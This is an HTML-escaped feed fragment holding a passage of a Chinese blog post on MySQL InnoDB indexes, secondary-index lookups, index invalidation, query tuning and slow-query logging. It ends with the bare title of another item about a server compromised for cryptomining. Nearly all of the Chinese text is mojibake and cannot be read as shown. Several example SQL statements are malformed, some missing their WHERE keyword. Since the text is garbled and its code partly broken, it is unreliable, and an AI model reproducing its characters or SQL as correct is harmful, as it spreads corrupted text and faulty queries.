data-ratio=&quot;0.5038051750380518&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/wAkAIFs11qaMZss2ia9Bx0yJNIfuKRhiawTxntAYMkhaT4mp2Xb7oPJXxMC9lUd7qfqbBcX3PqXiaz2NbsngubJJA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1314&quot;/&gt;&lt;/figure&gt;&lt;ul data-tool=&quot;mdniceç¼–è¾‘å™¨&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;éå¶å­èŠ‚ç‚¹ä¸å­˜æ•°æ®ï¼Œåªæœ‰ä¸»é”®å’Œç›¸å…³æŒ‡é’ˆ&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;å¶å­èŠ‚ç‚¹åŒ…å«ä¸»é”®ã€è¡Œæ•°æ®ã€æŒ‡é’ˆ&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;å¶å­èŠ‚ç‚¹ä¹‹é—´ç”±åŒå‘æŒ‡é’ˆä¸²è”å½¢æˆæœ‰åºåŒå‘é“¾è¡¨ï¼Œå¶å­èŠ‚ç‚¹å†…éƒ¨ä¹Ÿæ˜¯æœ‰åºçš„&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;èšé›†ç´¢å¼•æŒ‰ç…§å¦‚ä¸‹è§„åˆ™åˆ›å»ºï¼š&lt;/p&gt;&lt;ul data-tool=&quot;mdniceç¼–è¾‘å™¨&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;æœ‰ä¸»é”®æ—¶InnoDBåˆ©ç”¨ä¸»é”®æ¥ç”Ÿæˆ&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;æ²¡æœ‰ä¸»é”®ï¼ŒInnoDBä¼šé€‰æ‹©ä¸€ä¸ªéç©ºçš„å”¯ä¸€ç´¢å¼•æ¥åˆ›å»º&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;æ— ä¸»é”®ä¸”éNULLå”¯ä¸€ç´¢å¼•æ—¶ï¼ŒInnoDBä¼šéšå¼åˆ›å»ºä¸€ä¸ªè‡ªå¢çš„åˆ—æ¥åˆ›å»º&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;å‡å¦‚æˆ‘ä»¬è¦æŸ¥æ‰¾id=10çš„æ•°æ®ï¼Œå¤§è‡´è¿‡ç¨‹å¦‚ä¸‹ï¼š&lt;/p&gt;&lt;ul data-tool=&quot;mdniceç¼–è¾‘å™¨&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;ç´¢å¼•çš„æ ¹ç»“ç‚¹åœ¨å†…å­˜ä¸­ï¼Œ10&amp;gt;9 å› æ­¤æ‰¾åˆ°P3æŒ‡é’ˆ&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;P3æŒ‡å‘çš„æ•°æ®å¹¶æ²¡æœ‰åœ¨å†…å­˜ä¸­ï¼Œå› æ­¤äº§ç”Ÿ1æ¬¡ç£ç›˜IOè¯»å–ç£ç›˜å—3åˆ°å†…å­˜&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;åœ¨å†…å­˜ä¸­å¯¹ç£ç›˜å—3è¿›è¡ŒäºŒåˆ†æŸ¥æ‰¾ï¼Œæ‰¾åˆ°ID=9çš„å…¨éƒ¨å€¼&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h4 data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;éèšé›†ç´¢å¼•&lt;span/&gt;&lt;/h4&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;éèšé›†ç´¢å¼•çš„å¶å­èŠ‚ç‚¹ä¸­å­˜æ”¾çš„æ˜¯äºŒçº§ç´¢å¼•å€¼å’Œä¸»é”®é”®å€¼ï¼Œéå¶å­èŠ‚ç‚¹å’Œå¶å­èŠ‚ç‚¹éƒ½æ²¡æœ‰å­˜å‚¨æ•´è¡Œæ•°æ®å€¼ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;å‡è®¾æˆ‘ä»¬æœ‰studentè¡¨ï¼Œå°†nameä½œä¸ºäºŒçº§ç´¢å¼•ï¼Œé‚£ä¹ˆéèšé›†ç´¢å¼•çš„B+æ ‘ç»“æ„ï¼Œå¦‚å›¾ï¼š&lt;/p&gt;&lt;figure data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;img data-ratio=&quot;0.4888558692421991&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/wAkAIFs11qaMZss2ia9Bx0yJNIfuKRhiawcfyMslw9iayvVYUmA00ia3xQgP1NRefw2oIWBRhSbqomtK8icuibOC7eiaQ/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1346&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;ç”±äºéèšé›†ç´¢å¼•çš„å¶å­èŠ‚ç‚¹æ²¡æœ‰å­˜å‚¨è¡Œæ•°æ®ï¼Œå¦‚æœé€šè¿‡éèšé›†ç´¢å¼•æ¥æŸ¥æ‰¾éäºŒçº§ç´¢å¼•å€¼ï¼Œéœ€è¦åˆ†ä¸ºä¸¤æ­¥ï¼š&lt;/p&gt;&lt;ul data-tool=&quot;mdniceç¼–è¾‘å™¨&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;ç¬¬ä¸€ï¼šé€šè¿‡éèšé›†ç´¢å¼•çš„å¶å­èŠ‚ç‚¹æ¥ç¡®å®šæ•°æ®è¡Œå¯¹åº”çš„ä¸»é”®&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;ç¬¬äºŒï¼šé€šè¿‡ç›¸åº”çš„ä¸»é”®å€¼åœ¨èšé›†ç´¢å¼•ä¸­æŸ¥è¯¢åˆ°å¯¹åº”çš„è¡Œè®°å½•&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;æˆ‘ä»¬æŠŠé€šè¿‡éèšé›†ç´¢å¼•æ‰¾åˆ°ä¸»é”®å€¼ï¼Œå†æ ¹æ®ä¸»é”®å€¼ä»èšé›†ç´¢å¼•æ‰¾å¯¹äºè¡Œæ•°æ®çš„è¿‡ç¨‹ç§°ä¸ºï¼š&lt;strong&gt;å›è¡¨æŸ¥è¯¢&lt;/strong&gt;ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;æ¢å¥è¯è¯´ï¼šselect * from student where name = &#x27;Bob&#x27; å°†äº§ç”Ÿå›è¡¨æŸ¥è¯¢ï¼Œå› ä¸ºåœ¨nameç´¢å¼•çš„å¶å­èŠ‚ç‚¹æ²¡æœ‰å…¶ä»–å€¼ï¼Œåªèƒ½ä»èšé›†ç´¢å¼•è·å¾—ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;æ‰€ä»¥å¦‚æœæŸ¥æ‰¾çš„å­—æ®µåœ¨éèšé›†ç´¢å¼•å°±å¯ä»¥å®Œæˆï¼Œå°±å¯ä»¥é¿å…ä¸€æ¬¡å›è¡¨è¿‡ç¨‹ï¼Œè¿™ç§ç§°ä¸ºï¼šè¦†ç›–ç´¢å¼•ï¼Œæ‰€ä»¥select * å¹¶ä¸æ˜¯å¥½ä¹ æƒ¯ï¼Œéœ€è¦ä»€ä¹ˆæ‹¿ä»€ä¹ˆå°±å¥½ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;å‡å¦‚æˆ‘ä»¬è¦æŸ¥æ‰¾name=Tomçš„è®°å½•çš„æ‰€æœ‰å€¼ï¼Œå¤§è‡´è¿‡ç¨‹å¦‚ä¸‹ï¼š&lt;/p&gt;&lt;ul data-tool=&quot;mdniceç¼–è¾‘å™¨&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;ä»éèšé›†ç´¢å¼•å¼€å§‹ï¼Œæ ¹èŠ‚ç‚¹åœ¨å†…å­˜ä¸­ï¼ŒæŒ‰ç…§nameçš„å­—å…¸åºæ‰¾åˆ°P3æŒ‡é’ˆ&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;P3æŒ‡é’ˆæ‰€æŒ‡å‘çš„ç£ç›˜å—ä¸åœ¨å†…å­˜ä¸­ï¼Œäº§ç”Ÿ1æ¬¡ç£ç›˜IOåŠ è½½åˆ°å†…å­˜&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;åœ¨å†…å­˜ä¸­å¯¹ç£ç›˜å—3çš„æ•°æ®è¿›è¡Œæœç´¢ï¼Œè·å¾—name=tomçš„è®°å½•çš„ä¸»é”®å€¼ä¸º4&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;æ ¹æ®ä¸»é”®å€¼4ä»èšé›†ç´¢å¼•çš„æ ¹èŠ‚ç‚¹ä¸­è·å¾—P2æŒ‡é’ˆ&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;P2æŒ‡é’ˆæ‰€æŒ‡å‘çš„ç£ç›˜å—ä¸åœ¨å†…å­˜ä¸­ï¼Œäº§ç”Ÿç¬¬2æ¬¡ç£ç›˜IOåŠ è½½åˆ°å†…å­˜&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;å°†ä¸Šä¸€æ­¥è·å¾—çš„æ•°æ®ï¼Œåœ¨å†…å­˜ä¸­è¿›è¡ŒäºŒåˆ†æŸ¥æ‰¾è·å¾—å…¨éƒ¨è¡Œæ•°æ®&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;ä¸Šè¿°æŸ¥è¯¢å°±åŒ…å«äº†ä¸€æ¬¡å›è¡¨è¿‡ç¨‹ï¼Œå› æ­¤æ€§èƒ½æ¯”ä¸»é”®æŸ¥è¯¢æ…¢äº†ä¸€å€ï¼Œå› æ­¤å°½é‡ä½¿ç”¨ä¸»é”®æŸ¥è¯¢ï¼Œä¸€æ¬¡å®Œäº‹ã€‚&lt;/p&gt;&lt;h2 data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;span&gt;4. æ…¢SQLè§£å†³æ€è·¯&lt;/span&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;å‡ºç°æ…¢SQLçš„åŸå› å¾ˆå¤šï¼Œæˆ‘ä»¬æŠ›å¼€å•è¡¨æ•°äº¿è®°å½•å’Œæ— ç´¢å¼•çš„ç‰¹æ®Šæƒ…å†µï¼Œæ¥è®¨è®ºä¸€äº›æ›´æœ‰æ™®éæ„ä¹‰çš„æ…¢SQLåŸå› å’Œè§£å†³ä¹‹é“ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;æˆ‘ä»¬ä»ä¸¤ä¸ªæ–¹é¢æ¥è¿›è¡Œé˜è¿°ï¼š&lt;/p&gt;&lt;figure data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;img data-ratio=&quot;0.33779761904761907&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/wAkAIFs11qaMZss2ia9Bx0yJNIfuKRhiawibEssFkqTicicyicMbibAPy4NoZk2dKJvHUZLSnVldt6PtQzkAo4c5cd6VA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1344&quot;/&gt;&lt;/figure&gt;&lt;h3 data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;4.1 ç´¢å¼•è®¾ç½®åŸåˆ™&lt;span/&gt;&lt;/h3&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;ç¨‹åºå‘˜çš„è§’åº¦å’Œå­˜å‚¨å¼•æ“çš„è§’åº¦æ˜¯ä¸ä¸€æ ·çš„ï¼Œç´¢å¼•å†™çš„å¥½ï¼ŒSQLè·‘å¾—å¿«ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;å‡å¦‚è¡¨ä¸­æœ‰1000wè®°å½•ï¼Œå…¶ä¸­æœ‰statuså­—æ®µè¡¨ç¤ºçŠ¶æ€ï¼Œå¯èƒ½90%çš„æ•°æ®status=1ï¼Œå¯ä»¥ä¸å°†statusä½œä¸ºç´¢å¼•ï¼Œå› ä¸ºå…¶å¯¹æ•°æ®è®°å½•åŒºåˆ†åº¦å¾ˆä½ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;æ¯ä¸ªç´¢å¼•éƒ½éœ€è¦å ç”¨ç£ç›˜ç©ºé—´ï¼Œä¿®æ”¹è¡¨æ•°æ®æ—¶ä¼šå¯¹ç´¢å¼•è¿›è¡Œæ›´æ–°ï¼Œç´¢å¼•è¶Šå¤šï¼Œæ›´æ–°è¶Šå¤æ‚ã€‚&lt;/p&gt;&lt;blockquote data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;p&gt;å› ä¸ºæ¯æ·»åŠ ä¸€ä¸ªç´¢å¼•ï¼Œ.ibdæ–‡ä»¶ä¸­å°±éœ€è¦å¤šç»´æŠ¤ä¸€ä¸ªB+Treeç´¢å¼•æ ‘ï¼Œå¦‚æœæŸä¸€ä¸ªtableä¸­å­˜åœ¨10ä¸ªç´¢å¼•ï¼Œé‚£ä¹ˆå°±éœ€è¦ç»´æŠ¤10æ£µB+Treeï¼Œå†™å…¥æ•ˆç‡ä¼šé™ä½ï¼Œå¹¶ä¸”ä¼šæµªè´¹ç£ç›˜ç©ºé—´ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;å¦‚æœæŸä¸ªå­—æ®µç»å¸¸ç”¨æ¥åšæŸ¥è¯¢æ¡ä»¶ï¼Œé‚£ä¹ˆè¯¥å­—æ®µçš„æŸ¥è¯¢é€Ÿåº¦ä¼šå½±å“æ•´ä¸ªè¡¨çš„æŸ¥è¯¢é€Ÿåº¦ï¼Œå±äºçƒ­é—¨å­—æ®µï¼Œä¸ºå…¶å»ºç«‹ç´¢å¼•éå¸¸å¿…è¦ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;å¯¹äºéœ€è¦ç»å¸¸ä½¿ç”¨ORDER BYã€GROUP BYã€DISTINCTå’ŒUNIONç­‰æ“ä½œçš„å­—æ®µå»ºç«‹ç´¢å¼•ï¼Œå¯ä»¥æœ‰æ•ˆå€ŸåŠ©B+æ ‘çš„ç‰¹æ€§æ¥åŠ é€Ÿæ‰§è¡Œã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;ä¸»é”®å¯ä»¥ç”¨æ¥åˆ›å»ºèšé›†ç´¢å¼•ï¼Œå¤–é”®ä¹Ÿæ˜¯å”¯ä¸€çš„ä¸”å¸¸ç”¨äºè¡¨å…³è”çš„å­—æ®µï¼Œä¹Ÿéœ€è¦å»ºç´¢å¼•æ¥æé«˜æ€§èƒ½ã€‚&lt;/p&gt;&lt;h3 data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;4.2 SQLçš„ä¼˜åŒ–&lt;span/&gt;&lt;/h3&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;å¦‚æœæ•°æ®åº“è¡¨çš„ç´¢å¼•è®¾ç½®æ¯”è¾ƒåˆç†ï¼ŒSQLè¯­å¥ä¹¦å†™ä¸å½“ä¼šé€ æˆç´¢å¼•å¤±æ•ˆï¼Œç”šè‡³é€ æˆå…¨è¡¨æ‰«æï¼Œè¿…é€Ÿæ‹‰ä½æ€§èƒ½ã€‚&lt;/p&gt;&lt;h4 data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;ç´¢å¼•å¤±æ•ˆ&lt;span/&gt;&lt;/h4&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;æˆ‘ä»¬åœ¨å†™SQLçš„æ—¶å€™åœ¨æŸäº›æƒ…å†µä¸‹ä¼šå‡ºç°ç´¢å¼•å¤±æ•ˆçš„æƒ…å†µï¼š&lt;/p&gt;&lt;blockquote data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;p&gt;select id from std upper(name) = &#x27;JIM&#x27;;&lt;/p&gt;&lt;/blockquote&gt;&lt;blockquote data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;p&gt;select id from std where id+1=10;&lt;/p&gt;&lt;/blockquote&gt;&lt;ul data-tool=&quot;mdniceç¼–è¾‘å™¨&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;strong&gt;å¯¹ç´¢å¼•ä½¿ç”¨&amp;lt;&amp;gt; ã€not in ã€not existã€!=&lt;/strong&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;blockquote data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;p&gt;select id from std where name != &#x27;jim&#x27;;&lt;/p&gt;&lt;/blockquote&gt;&lt;blockquote data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;p&gt;select id from std name like &#x27;%jim&#x27;;&lt;/p&gt;&lt;/blockquote&gt;&lt;blockquote data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;p&gt;æ¯”å¦‚ï¼šå­—ç¬¦ä¸²ç±»å‹ç´¢å¼•å­—æ®µä¸åŠ å¼•å·ï¼Œselect id from std name = 100;ä¿æŒå˜é‡ç±»å‹ä¸å­—æ®µç±»å‹ä¸€è‡´&lt;/p&gt;&lt;/blockquote&gt;&lt;blockquote data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;p&gt;å¹¶ä¸æ˜¯æ‰€æœ‰çš„oréƒ½ä¼šä½¿ç´¢å¼•å¤±æ•ˆï¼Œå¦‚æœorè¿æ¥çš„æ‰€æœ‰å­—æ®µéƒ½è®¾ç½®äº†ç´¢å¼•ï¼Œæ˜¯ä¼šèµ°ç´¢å¼•çš„ï¼Œä¸€æ—¦æœ‰ä¸€ä¸ªå­—æ®µæ²¡æœ‰ç´¢å¼•ï¼Œå°±ä¼šèµ°å…¨è¡¨æ‰«æã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;blockquote data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;p&gt;è”åˆç´¢å¼•åŒ…å«key1ï¼Œkey2ï¼Œkey3ä¸‰åˆ—ï¼Œä½†SQLè¯­å¥æ²¡æœ‰key1ï¼Œæ ¹æ®è”åˆç´¢å¼•çš„æœ€å·¦åŒ¹é…åŸåˆ™ï¼Œä¸ä¼šèµ°è”åˆç´¢å¼•ã€‚&lt;br/&gt;select name from table where key2=1 and key3=2;&lt;/p&gt;&lt;/blockquote&gt;&lt;h4 data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;å¥½çš„å»ºè®®&lt;/h4&gt;&lt;blockquote data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;p&gt;å¯¹äºæ•°æ®åº“æ¥è¯´ï¼Œåœ¨ç»å¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œè¿æ¥ä¼šæ¯”å­æŸ¥è¯¢æ›´å¿«ï¼Œä½¿ç”¨è¿æ¥çš„æ–¹å¼ï¼ŒMySQLä¼˜åŒ–å™¨ä¸€èˆ¬å¯ä»¥ç”Ÿæˆæ›´ä½³çš„æ‰§è¡Œè®¡åˆ’ï¼Œæ›´é«˜æ•ˆåœ°å¤„ç†æŸ¥è¯¢&lt;br/&gt;è€Œå­æŸ¥è¯¢å¾€å¾€éœ€è¦è¿è¡Œé‡å¤çš„æŸ¥è¯¢ï¼Œå­æŸ¥è¯¢ç”Ÿæˆçš„ä¸´æ—¶è¡¨ä¸Šä¹Ÿæ²¡æœ‰ç´¢å¼•ï¼Œ å› æ­¤æ•ˆç‡ä¼šæ›´ä½ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;blockquote data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;p&gt;ç¦æ­¢åˆ†é¡µæŸ¥è¯¢åç§»é‡è¿‡å¤§ï¼Œå¦‚limit 100000,10&lt;/p&gt;&lt;/blockquote&gt;&lt;ul data-tool=&quot;mdniceç¼–è¾‘å™¨&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;&lt;strong&gt;ä½¿ç”¨è¦†ç›–ç´¢å¼•&lt;/strong&gt;&lt;br/&gt;å‡å°‘select * å€ŸåŠ©è¦†ç›–ç´¢å¼•ï¼Œå‡å°‘å›è¡¨æŸ¥è¯¢æ¬¡æ•°ã€‚&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;&lt;strong&gt;å¤šè¡¨å…³è”æŸ¥è¯¢æ—¶ï¼Œå°è¡¨åœ¨å‰ï¼Œå¤§è¡¨åœ¨å&lt;/strong&gt;&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;blockquote data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;p&gt;åœ¨MySQLä¸­ï¼Œæ‰§è¡Œfromåçš„è¡¨å…³è”æŸ¥è¯¢æ˜¯ä»å·¦å¾€å³æ‰§è¡Œçš„ï¼Œç¬¬ä¸€å¼ è¡¨ä¼šæ¶‰åŠåˆ°å…¨è¡¨æ‰«æï¼Œæ‰€ä»¥å°†å°è¡¨æ”¾åœ¨å‰é¢ï¼Œå…ˆæ‰«å°è¡¨ï¼Œæ‰«æå¿«æ•ˆç‡è¾ƒé«˜ï¼Œåœ¨æ‰«æåé¢çš„å¤§è¡¨ï¼Œæˆ–è®¸åªæ‰«æå¤§è¡¨çš„å‰100è¡Œå°±ç¬¦åˆè¿”å›æ¡ä»¶å¹¶returnäº†ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;blockquote data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;p&gt;MySQLé‡‡ç”¨ä»å·¦å¾€å³çš„é¡ºåºè§£æwhereå­å¥ï¼Œå¯ä»¥å°†è¿‡æ»¤æ•°æ®å¤šçš„æ¡ä»¶æ”¾åœ¨å‰é¢ï¼Œæœ€å¿«é€Ÿåº¦ç¼©å°ç»“æœé›†ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;ul data-tool=&quot;mdniceç¼–è¾‘å™¨&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;&lt;strong&gt;ä½¿ç”¨å°èŒƒå›´äº‹åŠ¡ï¼Œè€Œéå¤§èŒƒå›´äº‹åŠ¡&lt;/strong&gt;&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;&lt;strong&gt;éµå¾ªæœ€å·¦åŒ¹é…åŸåˆ™&lt;/strong&gt;&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;&lt;strong&gt;ä½¿ç”¨è”åˆç´¢å¼•ï¼Œè€Œéå»ºç«‹å¤šä¸ªå•ç‹¬ç´¢å¼•&lt;/strong&gt;&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;4.3 æ…¢SQLçš„åˆ†æ&lt;span/&gt;&lt;/h3&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;åœ¨åˆ†ææ…¢SQLä¹‹å‰éœ€è¦é€šè¿‡MySQLè¿›è¡Œç›¸å…³è®¾ç½®ï¼š&lt;/p&gt;&lt;pre data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;code&gt;å¼€å¯ï¼šSET GLOBAL slow_query_log = 1;&lt;br/&gt;å¼€å¯çŠ¶æ€ï¼šSHOW VARIABLES LIKE &lt;span&gt;&#x27;%slow_query_log%&#x27;&lt;/span&gt;;&lt;br/&gt;è®¾ç½®é˜ˆå€¼ï¼šSET GLOBAL long_query_time=3;&lt;br/&gt;æŸ¥çœ‹é˜ˆå€¼ï¼šSHOW GLOBAL VARIABLES LIKE &lt;span&gt;&#x27;long_query_time%&#x27;&lt;/span&gt;;Â &lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h4 data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;explainåˆ†æSQL&lt;span/&gt;&lt;/h4&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;explainå‘½ä»¤åªéœ€è¦åŠ åœ¨selectä¹‹å‰å³å¯ï¼Œä¾‹å¦‚:&lt;/p&gt;&lt;blockquote data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;p&gt;explain select * from std where id &amp;lt; 100;&lt;/p&gt;&lt;/blockquote&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;è¯¥å‘½ä»¤ä¼šå±•ç¤ºsqlè¯­å¥çš„è¯¦ç»†æ‰§è¡Œè¿‡ç¨‹ï¼Œå¸®åŠ©æˆ‘ä»¬å®šä½é—®é¢˜ï¼Œç½‘ä¸Šå…³äºexplainçš„ç”¨æ³•å’Œè®²è§£å¾ˆå¤šï¼Œæœ¬æ–‡ä¸å†å±•å¼€ã€‚&lt;/p&gt;&lt;h2 data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;span&gt;5. å°ç»“&lt;/span&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;æœ¬æ–‡ä»æ…¢SQLçš„å±å®³ã€Innodbå­˜å‚¨å¼•æ“ã€èšé›†ç´¢å¼•ã€éèšé›†ç´¢å¼•ã€ç´¢å¼•å¤±æ•ˆã€SQLä¼˜åŒ–ã€æ…¢SQLåˆ†æç­‰è§’åº¦è¿›è¡Œäº†é˜è¿°ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;MySQLçš„å¾ˆå¤šçŸ¥è¯†ç‚¹éƒ½éå¸¸å¤æ‚ï¼Œå¹¶éä¸€ä¸¤ç¯‡æ–‡ç« èƒ½è®²æ¸…æ¥šçš„ï¼Œå› æ­¤æœ¬æ–‡åœ¨å¾ˆå¤šåœ°æ–¹æ˜¾å¾—å¾ˆå•è–„ï¼Œå¥½åœ¨ç½‘ä¸Šèµ„æ–™éå¸¸å¤šã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;å¦‚æœæœ¬æ–‡èƒ½åœ¨æŸäº›æ–¹é¢å¯¹è¯»è€…æœ‰æ‰€å¯å‘ï¼Œè¶³çŸ£ã€‚&lt;/p&gt;&lt;hr/&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;å·²ç»åœ¨å†™Â MySQL é”çš„æ–‡ç« äº†ï¼Œå…³æ³¨æˆ‘è¿½æ›´å“Ÿ~&lt;/p&gt;&lt;section class=&quot;mp_profile_iframe_wrp&quot;&gt;&lt;mpprofile class=&quot;js_uneditable custom_select_card mp_profile_iframe&quot; data-pluginname=&quot;mpprofile&quot; data-id=&quot;MzkxNTE3NjQ3MA==&quot; data-headimg=&quot;http://mmbiz.qpic.cn/mmbiz_png/eSdk75TK4nEf5LN3Y4UErfNUkiaMseJPkdXA4xPD6Uicl8EqAJAEKVIKalU19xS41TO3aPmHK5bqbzGTwu3z92Kg/0?wx_fmt=png&quot; data-nickname=&quot;yesçš„ç»ƒçº§æ”»ç•¥&quot; data-alias=&quot;yes_java&quot; data-signature=&quot;ç”¨æ¥åœ°æ°”çš„è¯æ¥åˆ†äº«ä¸€äº›åç«¯æŠ€æœ¯æˆ–å†™ä¸€äº›æƒ³å†™çš„ã€‚&quot; data-from=&quot;0&quot;/&gt;&lt;/section&gt;&lt;/section&gt;
                &lt;/div&gt;&lt;/div&gt;</content:encoded>
</item>
<item>
<guid>860b1e9654091909d02231f8992544b5</guid>
<title>è®°ä¸€æ¬¡æœåŠ¡å™¨è¢«å…¥ä¾µæŒ–çŸ¿</title>
<link>https://toutiao.io/k/pks06jh</link>
